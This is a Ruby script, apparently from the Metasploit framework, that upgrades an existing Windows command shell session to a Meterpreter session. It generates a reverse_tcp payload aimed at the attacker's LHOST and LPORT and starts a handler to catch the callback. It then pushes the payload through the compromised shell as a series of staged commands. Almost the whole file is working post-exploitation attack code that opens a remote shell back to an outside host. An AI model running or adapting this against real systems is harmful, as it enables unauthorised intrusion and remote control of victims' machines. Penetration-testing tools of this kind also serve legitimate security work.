# $Id$
#
# Spawn a meterpreter session using an existing command shell session
#
# NOTE: Some of the following code is duplicated from lib/msf/core/exploit/cmdstager.rb
#
# This is really only to prove the concept for now.
#
# -jduck
#

use_handler = true

lhost = framework.datastore['LHOST']
lport = framework.datastore['LPORT']

if (session.type != "shell")
	raise RuntimeError, "Selected session is not a command shell session!"
end

# Process special var/val pairs...
#Msf::Ui::Common.process_cli_arguments($framework, ARGV)
# Create the payload instance
payload_name = 'windows/meterpreter/reverse_tcp'
payload = framework.payloads.create(payload_name)
options = 'LHOST='+lhost + ' LPORT='+lport
buf = payload.generate_simple('OptionStr' => options)


if (use_handler)
	#print_status("Starting handler for #{payload_name} on port #{lport}")
	multihandler = framework.modules.create("exploit/multi/handler")
	multihandler.datastore['LPORT'] = lport
	multihandler.datastore['LHOST'] = lhost
	multihandler.datastore['PAYLOAD'] = payload_name
	multihandler.datastore['ExitOnSession'] = false
	multihandler.datastore['EXITFUNC'] = 'process'
	multihandler.exploit_simple(
		'LocalInput'     => session.user_input,
		'LocalOutput'    => session.user_output,
		'Payload'        => payload_name,
		'RunAsJob'       => true)
	# It takes a little time for the resources to get set up, so sleep for
	# a bit to make sure the exploit is fully working.  Without this,
	# mod.get_resource doesn't exist when we need it.
	Rex::ThreadSafe.sleep(0.5)
end


#
# Show the progress of the upload
#
def progress(total, sent)
	done = (sent.to_f / total.to_f) * 100
	if (done.to_f < 99.00)
		print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
	end
end

los = 'win'
larch = ARCH_X86
opts = {
	#:persist => true
}
linelen = 1700
delay = 0.25

cmdstager = Rex::Exploitation::CmdStager.new(buf, framework, los, larch)
cmds = cmdstager.generate(opts, linelen)
if (cmds.nil? or cmds.length < 1)
	print_error("The command stager could not be generated")
	raise ArgumentError
end


total_bytes = 0
cmds.each { |cmd| total_bytes += cmd.length }

# $stderr.puts("CmdStager generated %u commands (%u bytes)" % [cmds.length, total_bytes])

begin
	sent = 0
	cmds.each { |cmd|
		ret = session.shell_command_token_win32(cmd)
		if (ret)
			ret.strip!
			print_error(ret) if (not ret.empty?)
		end

		sent += cmd.length

		select(nil, nil, nil, delay)

		progress(total_bytes, sent)
	}
rescue ::Interrupt
	# TODO: cleanup partial uploads!
end


if (use_handler)
	print_status("cleaning up...")
	# XXX: stop the job
end
